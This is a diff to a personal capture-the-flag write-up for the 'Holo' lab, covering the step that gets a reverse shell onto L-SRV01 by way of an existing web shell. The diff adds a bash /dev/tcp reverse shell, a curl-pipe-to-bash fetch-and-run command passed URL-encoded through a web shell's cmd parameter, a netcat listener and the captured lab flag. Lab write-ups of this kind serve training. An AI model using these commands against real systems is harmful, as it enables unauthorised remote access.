@@ -17,7 +17,10 @@ To begin, we will create a simple payload by placing the below code into a `.sh
 `#!/bin/bash`   
 `bash -i >& /dev/tcp/tun0ip/53 0>&1`
 
-The first line will declare that we are using the bash scripting language. The second line is the payload itself. For more information about this payload, check out this explain shell, [https://explainshell.com/explain?cmd=bash+-i+>%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0>%261](https://explainshell.com/explain?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0%3E%261).  
+- The first line will declare that we are using the bash scripting language. 
+- The second line is the payload itself. 
+
+For more information about this payload, check out this explain shell, [https://explainshell.com/explain?cmd=bash+-i+>%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0>%261](https://explainshell.com/explain?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0%3E%261).  
 
 Now that you have the payload ready to go, you can start up a local web server on your attacking machine using either _http.server_ or _updog_ or _php_. You can find example usage for all three below.  
 
@@ -27,7 +30,7 @@ Now that you have the payload ready to go, you can start up a local web server o
 
 Once you have a server started hosting the file, we can compile a command to execute the file. Find the command below.  
 
-Unencoded command: `curl http://10.x.x.x:80/bash.sh|bash &`
+Unencoded command: `curl http://10.x.x.x:80/shellscript.sh|bash &`
 
 As we have already mentioned, special characters can cause issues within URLs. To combat this, we can utilize URL encoding on any special characters. Find the encoded command below.
 
@@ -48,3 +51,34 @@ Command used: `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%
 ---
 
 # Your job
+
+- Create a `shellscript.sh` file with the following code:
+	`#!/bin/bash`
+	`bash -i >& /dev/tcp/10.50.74.165/53 0>&1`
+
+- Start up a local web server in the `shellscript.sh` directory on your attacking machine.
+	`python3 -m http.server 80`
+
+- On your browser visit the following URL:
+	http://admin.holo.live/dashboard.php?cmd=curl%20http%3A%2F%2F10.50.74.165%3A80%2Fshellscript.sh%7Cbash%20%26
+
+- On your attacking machine, start a listener using Netcat .
+	`nc -lvnp 53`
+
+- On the Reverse Shell you already have opened, run the following code:
+	`curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.74.165%3A80%2Fshellscript.sh%7Cbash%20%26'`
+
+	![[Task 19 - Going out with a SHEBANG!-20240919140944870.webp]]
+
+You have shell onto  L-SRV01.
+
+## Flag on L-SRV01
+
+- On the Reverse Shell go to `www-data@ip-10-200-95-33:/var/www$` and run:
+	`cat user.txt`
+
+	HOLO{3792d7d80c4dcabb8a533afddf06f666}
+
+- Submit the user flag on Task 4, question 2.
+
+**Next step:** [[Task 20 - Call me Mario, because I got all the bits]]
